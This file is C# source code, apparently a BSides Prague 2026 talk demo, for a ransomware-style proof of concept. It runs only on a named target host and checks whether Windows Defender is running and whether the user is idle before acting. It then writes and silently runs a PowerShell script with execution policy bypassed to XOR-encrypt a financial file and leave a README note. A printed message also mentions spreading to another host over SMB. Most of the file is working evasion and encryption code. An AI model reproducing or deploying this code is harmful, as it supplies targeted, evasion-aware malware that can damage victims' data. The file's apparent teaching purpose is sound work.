/*
 * ==========================================
 * Author:  Kashif Amanat
 * Event:   BSides Prague 2026
 * Contact: kashif.amanat1@gmail.com
 * ==========================================
 */

using System;
using System.Diagnostics;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;

class HostnameChecker
{
    private const string TargetHostname = "goltralabs";
    private const string TargetIp = "1.1.1.1";
    private const int TargetPort = 53;
    private const int NetworkTimeoutMs = 2000;

    // Dynamically resolved paths (set in Main)
    private static string BackupFilePath = "";
    private static string FinancialFilePath = "";
    private static string EncryptedBackupPath = "";
    private static string PowerShellScriptPath = "";

    // Win32 API declarations
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool GetComputerName(StringBuilder lpBuffer, ref uint nSize);

    [DllImport("user32.dll")]
    private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    [StructLayout(LayoutKind.Sequential)]
    private struct LASTINPUTINFO
    {
        public uint cbSize;
        public uint dwTime;
    }

    [DllImport("kernel32.dll")]
    private static extern uint GetTickCount();

    /// ========== USERNAME RESOLUTION USING WIN32 API ==========
    /// This method retrieves the current logged-in username without hardcoding
    /// You can reuse this in any other project to dynamically get the username
    /// =========================================================
    
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool GetUserName(StringBuilder lpBuffer, ref uint nSize);

    /// <summary>
    /// Gets the current logged-in username using Win32 API call (advapi32.dll)
    /// This method is completely reusable and requires no external dependencies
    /// 
    /// USAGE EXAMPLE:
    /// string currentUser = GetCurrentUsername();
    /// Console.WriteLine($"Current user: {currentUser}");
    /// </summary>
    /// <returns>The username of the currently logged-in user</returns>
    private static string GetCurrentUsername()
    {
        const uint MAX_USERNAME_LENGTH = 256;
        StringBuilder userName = new StringBuilder((int)MAX_USERNAME_LENGTH);
        uint userNameLength = MAX_USERNAME_LENGTH;

        if (GetUserName(userName, ref userNameLength))
        {
            return userName.ToString();
        }
        else
        {
            throw new Exception("Failed to retrieve username from Win32 API");
        }
    }

    /// <summary>
    /// Dynamically constructs the full user profile path without hardcoding
    /// Uses GetCurrentUsername() to get the username
    /// 
    /// USAGE EXAMPLE:
    /// string profilePath = GetUserProfilePath();
    /// Console.WriteLine($"Profile path: {profilePath}");
    /// </summary>
    /// <returns>The full path to the user's profile (e.g., C:\Users\kashi)</returns>
    private static string GetUserProfilePath()
    {
        string username = GetCurrentUsername();
        return Path.Combine("C:\\Users", username);
    }

    /// ========== END OF USERNAME RESOLUTION ==========

    static void Main()
    {
        try
        {
            // Initialize dynamic paths based on current username
            string userProfile = GetUserProfilePath();
            BackupFilePath = Path.Combine(userProfile, "Documents", "BSidesPRG", "BackupFiles", "README.txt");
            FinancialFilePath = Path.Combine(userProfile, "Documents", "BSidesPRG", "FinancialDetails.txt");
            EncryptedBackupPath = Path.Combine(userProfile, "Documents", "BSidesPRG", "BackupFiles", "FinancialDetails.enc");
            PowerShellScriptPath = Path.Combine(userProfile, "Documents", "BSidesPRG", "BackupFiles", "EncryptFile.ps1");

            Console.WriteLine($"[DEBUG] Current Username: {GetCurrentUsername()}");
            Console.WriteLine($"[DEBUG] User Profile Path: {userProfile}");
            Console.WriteLine($"[DEBUG] Backup Location: {BackupFilePath}\n");

            string hostname = GetHostname();
            bool hostnameMatches = hostname.Equals(TargetHostname, StringComparison.OrdinalIgnoreCase);
            bool networkCheck = CheckIpReachable(TargetIp, TargetPort, NetworkTimeoutMs);
            bool defenderRunning = CheckWindowsDefenderRunning();
            bool computerInUse = CheckComputerInUse(10); // 10 seconds

            Console.WriteLine($"Hostname: {hostname}");
            Console.WriteLine($"Hostname matches target: {hostnameMatches}");
            Console.WriteLine($"Ping or TCP port {TargetPort} reachable on {TargetIp}: {networkCheck}");
            Console.WriteLine($"Windows Defender service running: {defenderRunning}");
            Console.WriteLine($"Computer in use (last 10 seconds): {computerInUse}");

            if (hostnameMatches)
            {
                // Check if conditions are appropriate for execution
                // Conditions NOT appropriate if: Defender running OR Computer in use OR Network unreachable
                if (defenderRunning || computerInUse || !networkCheck)
                {
                    Console.WriteLine("\nConditions not appropriate for execution, continue to stay dormant and copy to the next host 192.168.1.140 over SMB to attempt there.");
                }
                else
                {
                    // All conditions are appropriate - proceed with encryption and backup
                    // Check for FinancialDetails.txt and create encrypted backup using PowerShell
                    if (File.Exists(FinancialFilePath))
                    {
                        CreatePowerShellEncryptionScript(hostname);
                        string md5Hash = ExecutePowerShellScript();
                        Console.WriteLine($"MD5 hash of FinancialDetails.txt: {md5Hash}");
                        Console.WriteLine($"Created encrypted backup at {EncryptedBackupPath}");
                        Console.WriteLine($"PowerShell script created at {PowerShellScriptPath}");
                    }
                    else
                    {
                        Console.WriteLine("FinancialDetails.txt not found - no backup created");
                    }

                    CreateBackupReadme(hostname);
                    Console.WriteLine($"Created backup file at {BackupFilePath}");
                }
            }
            else
            {
                Console.WriteLine("This is not the Target System and I Should not Run");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    private static bool CheckComputerInUse(int secondsThreshold)
    {
        if (!OperatingSystem.IsWindows())
        {
            return false;
        }

#pragma warning disable CA1416
        try
        {
            LASTINPUTINFO lastInputInfo = new() { cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO)) };
            if (GetLastInputInfo(ref lastInputInfo))
            {
                uint currentTick = GetTickCount();
                uint idleTime = currentTick - lastInputInfo.dwTime;
                uint thresholdMs = (uint)secondsThreshold * 1000;
                return idleTime < thresholdMs;
            }
            return false;
        }
        catch
        {
            return false;
        }
#pragma warning restore CA1416
    }

    private static bool CheckIpReachable(string ipAddress, int port, int timeoutMs)
    {
        try
        {
            using Ping ping = new();
            PingReply reply = ping.Send(ipAddress, timeoutMs);
            if (reply is not null && reply.Status == IPStatus.Success)
            {
                return true;
            }
        }
        catch
        {
            // Ignore ping exceptions and fall back to TCP port check below.
        }

        try
        {
            using TcpClient client = new();
            var connectTask = client.ConnectAsync(ipAddress, port);
            bool connectedInTime = connectTask.Wait(timeoutMs);
            return connectedInTime && client.Connected;
        }
        catch
        {
            return false;
        }
    }

    private static bool CheckWindowsDefenderRunning()
    {
        if (!OperatingSystem.IsWindows())
        {
            return false;
        }

#pragma warning disable CA1416
        try
        {
            using ServiceController defender = new("WdNisSvc");
            return defender.Status == ServiceControllerStatus.Running;
        }
        catch
        {
            return false;
        }
#pragma warning restore CA1416
    }

    private static void CreatePowerShellEncryptionScript(string hostname)
    {
        string directoryPath = Path.GetDirectoryName(PowerShellScriptPath) ?? string.Empty;
        if (!string.IsNullOrWhiteSpace(directoryPath))
        {
            Directory.CreateDirectory(directoryPath);
        }

        string powerShellScript = $@"
param(
    [string]$SourceFile = '{FinancialFilePath.Replace("'", "''")}',
    [string]$DestFile = '{EncryptedBackupPath.Replace("'", "''")}',
    [string]$Key = '{hostname.Replace("'", "''")}'
)

# Calculate MD5 hash
$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
$hash = [System.BitConverter]::ToString($md5.ComputeHash([System.IO.File]::ReadAllBytes($SourceFile))).Replace('-', '').ToLower()

# Read file bytes
$fileBytes = [System.IO.File]::ReadAllBytes($SourceFile)
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
$encryptedBytes = New-Object byte[] $fileBytes.Length

# XOR encryption
for ($i = 0; $i -lt $fileBytes.Length; $i++) {{
    $encryptedBytes[$i] = $fileBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
}}

# Save encrypted file
[System.IO.File]::WriteAllBytes($DestFile, $encryptedBytes)

# Output hash
Write-Output $hash
";

        File.WriteAllText(PowerShellScriptPath, powerShellScript);
    }

    private static string ExecutePowerShellScript()
    {
        try
        {
            ProcessStartInfo startInfo = new()
            {
                FileName = "powershell.exe",
                Arguments = $"-ExecutionPolicy Bypass -File \"{PowerShellScriptPath}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using Process process = Process.Start(startInfo) ?? throw new Exception("Failed to start PowerShell process");

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            if (process.ExitCode != 0)
            {
                throw new Exception($"PowerShell script failed: {error}");
            }

            return output.Trim();
        }
        catch (Exception ex)
        {
            throw new Exception($"Failed to execute PowerShell script: {ex.Message}");
        }
    }

    private static void CreateBackupReadme(string hostname)
    {
        string directoryPath = Path.GetDirectoryName(BackupFilePath) ?? string.Empty;
        if (!string.IsNullOrWhiteSpace(directoryPath))
        {
            Directory.CreateDirectory(directoryPath);
        }

        string content = "The test executed successfully.\r\n" +
                        "Hostname matched target system and checks completed.\r\n\r\n";

        if (File.Exists(EncryptedBackupPath))
        {
            content += "ENCRYPTED BACKUP CREATED VIA POWERSHELL:\r\n" +
                      $"Original file: {FinancialFilePath}\r\n" +
                      $"Encrypted backup: {EncryptedBackupPath}\r\n" +
                      $"PowerShell script: {PowerShellScriptPath}\r\n" +
                      $"Encryption method: XOR with hostname '{hostname}' as key\r\n\r\n" +
                      "DECRYPTION INSTRUCTIONS:\r\n" +
                      "1. Use the same PowerShell script with decryption logic\r\n" +
                      "2. Or manually XOR each byte with the hostname repeated as needed\r\n" +
                      "3. The original file will be restored\r\n";
        }

        File.WriteAllText(BackupFilePath, content);
    }

    /// <summary>
    /// Gets the computer hostname using Win32 API call
    /// </summary>
    /// <returns>The hostname of the computer</returns>
    private static string GetHostname()
    {
        const uint MAX_COMPUTERNAME_LENGTH = 15;
        StringBuilder computerName = new StringBuilder((int)MAX_COMPUTERNAME_LENGTH + 1);
        uint nameLength = MAX_COMPUTERNAME_LENGTH + 1;

        if (GetComputerName(computerName, ref nameLength))
        {
            return computerName.ToString();
        }
        else
        {
            throw new Exception("Failed to retrieve computer name from Win32 API");
        }
    }
}
